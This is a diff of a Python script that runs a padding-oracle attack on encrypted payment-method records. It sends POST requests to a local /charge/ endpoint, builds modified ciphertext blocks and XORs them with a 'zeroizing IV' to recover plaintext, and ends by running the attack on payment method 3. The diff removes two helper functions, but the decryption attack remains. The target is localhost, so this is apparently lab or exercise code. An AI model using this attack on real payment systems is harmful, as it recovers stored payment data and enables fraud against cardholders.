@@ -1,6 +1,6 @@
 import requests
-from sqlalchemy import create_engine, select, insert, delete, func, Column, String, ForeignKey
-from sqlalchemy.orm import Session, scoped_session, sessionmaker, declarative_base, Mapped, mapped_column
+from sqlalchemy import create_engine, insert, delete, Column, String, ForeignKey
+from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base, Mapped, mapped_column
 from dataclasses import dataclass
 import base64
 
@@ -29,40 +29,12 @@ class PaymentMethod(Base):
     def __repr__(self):
         return f'<PaymentMethod {self.id!r}>'
 
-
 # Base URL for the POST request
 base_url = "http://127.0.0.1:5000/charge/"
 
+# Returns the PaymentMethod record with the given ID
 def get_payment_method(id):
     return PaymentMethod.query.get(id)
-
-# Creates n CT variants with the given zeroizing IV and payment method ID
-# Returns the ID of the first variant
-def ct_variants(zeroizing_iv, payment_method_id, n):
-    with Session(engine) as session:
-        stmt = select(func.insert_ct_variants(zeroizing_iv, payment_method_id, n))
-        r = session.execute(stmt)
-        session.commit()
-        return r.scalar()
-
-def find_candidate(start_id):
-    max_attempts = 256
-
-    # Iterate over ID values
-    for i in range(start_id, start_id + max_attempts):
-        url = f"{base_url}{i}"
-        try:
-            # Make the HTTP POST request
-            response = requests.post(url)
-            print("URL: %s", url)
-            # Check for success (HTTP status code 2xx)
-            if response.ok:
-                print(f"Success! ID: {i}")
-                break
-        except requests.RequestException as e:
-            print(f"Request failed for ID {i}: {e}")
-    else:
-        print("No successful response within the given ID range.")
 
 # Creates a candidate record with the given payment method and first block
 # which has been modified to test the padding for correctness
@@ -129,7 +101,6 @@ def attack_second_block(payment_method):
     return bytes(a ^ b for a, b in zip(ct[:16], zeroizing_iv)).decode("utf-8")
         
     
-
 pm = get_payment_method(3)
 result = attack_second_block(pm)
 print(result)
